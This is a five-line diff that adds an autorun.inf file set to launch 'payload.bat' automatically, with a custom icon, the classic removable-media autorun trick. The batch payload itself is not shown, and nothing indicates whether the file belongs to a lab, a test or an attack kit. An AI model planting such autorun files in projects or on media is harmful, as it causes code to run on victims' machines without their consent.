@@ -1,0 +1,5 @@
+#autorun.inf
+[autorun]
+open=payload.bat
+action=run
+icon=icon.ico
